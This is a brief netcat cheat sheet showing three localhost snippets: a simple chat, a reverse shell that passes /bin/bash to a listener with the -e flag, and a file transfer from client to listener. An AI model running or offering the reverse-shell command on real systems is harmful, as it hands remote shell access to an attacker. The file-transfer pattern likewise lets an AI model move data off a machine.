#bash(chat)
```
# server
nc -lvp 8888

# client
nc 127.0.0.1 8888
```

#bash(reverse_shell)
```
# server
nc -lvp 8888

# client
nc 127.0.0.1 8888 -e /bin/bash
```

#bash(file_download)
```
# server
nc -lvp 8888 > /tmp/output.txt

# client
nc 127.0.0.1 8888 < /tmp/input.txt
```
